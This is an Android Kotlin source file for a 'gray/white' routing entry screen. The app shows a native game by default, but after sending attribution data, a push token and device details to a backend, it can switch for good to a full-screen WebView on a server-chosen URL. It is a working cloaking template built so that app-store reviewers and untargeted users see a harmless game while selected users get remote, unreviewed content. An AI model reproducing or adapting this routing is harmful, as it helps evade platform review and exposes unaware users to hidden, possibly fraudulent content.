package com.example.grayshell.startup

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.messaging.FirebaseMessaging
import com.example.grayshell.NativeContentActivity
import com.example.grayshell.blueprint.AppBlueprint
import com.example.grayshell.blueprint.ChannelResult
import com.example.grayshell.portal.AlertPortal
import com.example.grayshell.portal.OfflinePortal
import com.example.grayshell.portal.StreamPortal
import com.example.grayshell.reach.ReachDispatch
import com.example.grayshell.vault.DataVault
import com.example.grayshell.wire.NetWire
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.util.Locale
import kotlin.coroutines.resume

/**
 * Entry-point router. Shows the branded loading screen while performing
 * gray/white attribution-based routing in the background.
 *
 * State machine (mirrors the Flutter guide exactly):
 *
 *  UNDECIDED (first launch):
 *    1. No internet → OfflinePortal → native game
 *    2. Has internet → AppsFlyer (30s) → fetchConfig → decide
 *       ok+url → STREAM → AlertPortal? → StreamPortal
 *       fail   → NATIVE → LoadingActivity
 *
 *  STREAM (was WebView last time):
 *    1. No internet → OfflinePortal with savedUrl
 *    2. Cold push URL → StreamPortal (highest priority)
 *    3. AppsFlyer (10s) → fetchConfig
 *       ok+url    → StreamPortal(newUrl)
 *       fail+savedUrl → StreamPortal(savedUrl)
 *       fail+noSaved  → OfflinePortal
 *
 *  NATIVE (was game last time):
 *    → NativeContentActivity (always, no network needed)
 */
class WelcomePortal : AppCompatActivity() {

    private lateinit var vault: DataVault
    private lateinit var wire: NetWire
    private val scope = CoroutineScope(Dispatchers.Main)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hideSystemUi()
        vault = DataVault(applicationContext)
        wire  = NetWire(applicationContext)

        // Show existing branded loading screen (indeterminate — keeps animating
        // until routing finishes, no premature "full" bar, dots never freeze).
        setContentView(
            com.example.grayshell.LoadingView(
                this, indeterminate = true
            ) { /* never auto-completes */ }
        )

        // Handle cold push tap.
        if (intent.getBooleanExtra(EXTRA_FROM_PUSH, false)) {
            val pushUrl = intent.getStringExtra(EXTRA_PUSH_URL)
            if (!pushUrl.isNullOrBlank()) {
                log("Cold push URL received: $pushUrl")
                vault.coldPushUrl = pushUrl
            }
        }

        scope.launch { route() }
    }

    // ── State machine ───────────────────────────────────────────────────

    private suspend fun route() {
        if (AppBlueprint.debugForceStreamUrl.isNotBlank()) {
            log("DEBUG: forcing stream URL ${AppBlueprint.debugForceStreamUrl}")
            goGray(AppBlueprint.debugForceStreamUrl)
            return
        }

        // Cold-push URL always wins — open WebView on it directly.
        val coldPush = vault.coldPushUrl
        if (!coldPush.isNullOrBlank()) {
            log("Cold push URL present → STREAM directly: $coldPush")
            vault.coldPushUrl = null
            // Make sure subsequent launches keep using stream mode.
            if (vault.runChannel == DataVault.CHANNEL_UNDECIDED)
                vault.runChannel = DataVault.CHANNEL_STREAM
            goGray(coldPush)
            return
        }

        when (vault.runChannel) {
            DataVault.CHANNEL_NATIVE -> {
                log("Channel=NATIVE → game")
                goNative()
            }
            DataVault.CHANNEL_STREAM -> {
                log("Channel=STREAM → handleOnlineReturn")
                handleOnlineReturn()
            }
            else -> {
                log("Channel=UNDECIDED → handleFirstLaunch")
                handleFirstLaunch()
            }
        }
    }

    /** First launch — resolve channel from scratch. */
    private suspend fun handleFirstLaunch() {
        if (!ensureInternet(isFirstLaunch = true)) return

        val tracker = (applicationContext as AppEntry).trackingDispatch
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionFirstMs)
        log("Attribution (first): $attribution")

        val result = fetchConfig(attribution)
        if (result.active && !result.destination.isNullOrBlank()) {
            vault.runChannel     = DataVault.CHANNEL_STREAM
            vault.destinationUrl = result.destination
            vault.urlExpiresAt   = result.expiresAt
            log("Backend → STREAM: ${result.destination}")
            goGray(result.destination)
        } else {
            vault.runChannel = DataVault.CHANNEL_NATIVE
            log("Backend → NATIVE")
            goNative()
        }
    }

    /** Returning user who was previously in stream (WebView) mode. */
    private suspend fun handleOnlineReturn() {
        if (!ensureInternet(isFirstLaunch = false)) return

        // Cold push URL takes HIGHEST priority.
        val coldPush = vault.consumeColdPushUrl()
        if (!coldPush.isNullOrBlank()) {
            log("Cold push priority → $coldPush")
            goGray(coldPush)
            return
        }

        val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null
        log("SavedUrl=${savedUrl.let { it?.take(40) }}")

        val tracker = (applicationContext as AppEntry).trackingDispatch
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionReturnMs)
        log("Attribution (return): $attribution")

        val result = fetchConfig(attribution)
        when {
            result.active && !result.destination.isNullOrBlank() -> {
                vault.destinationUrl = result.destination
                vault.urlExpiresAt   = result.expiresAt
                log("Backend → STREAM (new): ${result.destination}")
                goGray(result.destination)
            }
            !savedUrl.isNullOrBlank() -> {
                log("Backend fallback → savedUrl: $savedUrl")
                goGray(savedUrl)
            }
            else -> {
                log("No URL available → OfflinePortal")
                startActivity(Intent(this, OfflinePortal::class.java))
                finish()
            }
        }
    }

    /** Returns true if internet is available, navigates to offline/native otherwise. */
    private suspend fun ensureInternet(isFirstLaunch: Boolean): Boolean {
        val online = withTimeoutOrNull(10_000L) {
            suspendCancellableCoroutine<Boolean> { cont ->
                scope.launch {
                    wire.connectivityFlow.collect { ok ->
                        if (ok && cont.isActive) cont.resume(true)
                    }
                }
            }
        } ?: false

        if (online) online else {
            log("No internet")
            if (isFirstLaunch) {
                goNative()
            } else {
                val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null
                val i = Intent(this, OfflinePortal::class.java).apply {
                    if (!savedUrl.isNullOrBlank())
                        putExtra(OfflinePortal.EXTRA_RETURN_URL, savedUrl)
                }
                startActivity(i)
                finish()
            }
            return false
        }
        return true
    }

    /** POST to config endpoint and parse the result. */
    private suspend fun fetchConfig(attribution: Map<String, Any?>): ChannelResult {
        val tracker = (applicationContext as AppEntry).trackingDispatch
        val fcmToken = vault.fcmToken ?: getFcmToken()?.also { vault.fcmToken = it }

        val body = tracker.buildRequestBody(
            attribution    = attribution,
            os             = "Android",
            locale         = Locale.getDefault().toLanguageTag().replace('-', '_'),
            pushToken      = fcmToken,
            firebaseProject = AppBlueprint.resolveAnalyticsProject()
        )
        return ReachDispatch(buildUserAgent()).fetchChannel(body)
    }

    // ── Navigation ──────────────────────────────────────────────────────

    private fun goNative() {
        // TODO(you): point this at your real native game/content host Activity.
        startActivity(
            Intent(this, NativeContentActivity::class.java)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        finish()
    }

    private fun goGray(url: String) {
        if (vault.shouldShowNotifScreen()) {
            startActivity(
                Intent(this, AlertPortal::class.java)
                    .putExtra(AlertPortal.EXTRA_TARGET_URL, url)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
        } else {
            startActivity(
                Intent(this, StreamPortal::class.java)
                    .putExtra(StreamPortal.EXTRA_STREAM_URL, url)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
        }
        finish()
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    private suspend fun getFcmToken(): String? =
        withTimeoutOrNull(5_000L) {
            suspendCancellableCoroutine { cont ->
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (cont.isActive) cont.resume(if (task.isSuccessful) task.result else null)
                }
            }
        }

    private fun buildUserAgent(): String =
        "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.BRAND} ${Build.MODEL.replace(" ", "_")})" +
        " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"

    private fun hideSystemUi() {
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
        if (fromPush && !pushUrl.isNullOrBlank()) {
            val dest = vault.destinationUrl?.takeIf { vault.isUrlValid() }
            startActivity(
                Intent(this, StreamPortal::class.java)
                    .putExtra(StreamPortal.EXTRA_STREAM_URL, dest ?: pushUrl)
                    .putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
                    .putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
            finish()
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }

    private fun log(msg: String) { Log.i("WelcomePortal", msg) }

    companion object {
        const val EXTRA_FROM_PUSH = "from_push"
        const val EXTRA_PUSH_URL  = "push_url"
    }
}
